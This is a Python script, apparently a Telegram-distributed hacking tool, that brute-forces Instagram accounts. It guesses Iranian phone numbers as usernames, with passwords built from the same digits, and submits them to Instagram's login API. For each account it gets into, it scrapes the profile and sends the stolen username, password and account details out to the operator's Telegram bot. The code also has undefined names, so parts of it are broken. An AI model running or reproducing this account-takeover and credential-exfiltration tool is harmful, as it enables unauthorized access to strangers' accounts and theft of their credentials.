import requests,random,user_agent,os,pyfiglet
from user_agent import generate_user_agent
from secrets import token_hex
import time,secrets
from uuid import uuid4
G = '\033[1;32m'
E = '\033[1;31m'
S = '\033[1;33m'
A = '\033[1;34m'
X = '\033[1;35m'
F = '\033[1;36m'
name = 'Mala'
print('''
\x1b[92;1m-------------------------------------------------------
\x1b[92;1m.##.....##....###....##..........###...
\x1b[92;1m.###...###...##.##...##.........##.##..
\x1b[92;1m.####.####..##...##..##........##...##.
\x1b[92;1m.##.###.##.##.....##.##.......##.....##
\x1b[92;1m.##.....##.#########.##.......#########
\x1b[92;1m.##.....##.##.....##.##.......##.....##
\x1b[92;1m.##.....##.##.....##.########.##.....##
\x1b[92;1m-------------------------------------------------------
AUTHOR  : @Mala_bek4s

TELEGRAM  : @team453
-------------------------------------------------------
''')
token = input("Token Bot :")
id = input("Id telegram :")
time.sleep(2)
user = '0987654321'

def checker(userQ, password, username, post):
	cookie = secrets.token_hex(8) * 2
	head = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36  ', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
	url_id = f"https://www.instagram.com/{userQ}/?__a=1"
	req_id = requests.get(url_id, headers=head).json()
	name = str(req_id['graphql']['user']['full_name'])
	id = str(req_id['graphql']['user']['id'])
	followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
	following = str(req_id['graphql']['user']['edge_follow']['count'])
	re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
	ree = re.json()
	date = ree['data']
	check = (f"""
New Account Instagram ✅
- - - - - - - - - - - - - - - - - - - - - - - -
name = {name}
user = {userQ}
username = {username}
password = {password}
following = {following}
followers = {followes}
id = {id}
posts = {post}
date : {date}
- - - - - - - - - - - - - - - - - - - - - - - -
BY - @mala_bek4s - @team453""")
	requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=\n {check} \n")
	print(G+check)
url = 'https://i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
while True:
	us = str(''.join(random.choice(user) for i in range(7)))
	username = "+98914"+us
	password = "0914"+us
	uid = str(uuid4())
	data = {'uuid':uid, 
         'password':password, 
         'username':username,
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
	req = requests.post(url,headers=headers,data=data)
	if 'logged_in_user' in req.json():
		userQ = req.json()['logged_in_user']['username']
		post = mala.posts(userQ)
		checker(userQ, password, username, post)
	elif '"message":"challenge_required","challenge"' in req.json():
		print(S+'Hacked : '+username+':'+password)
	else:
		print(E+'Not Hack : '+username+':'+password)
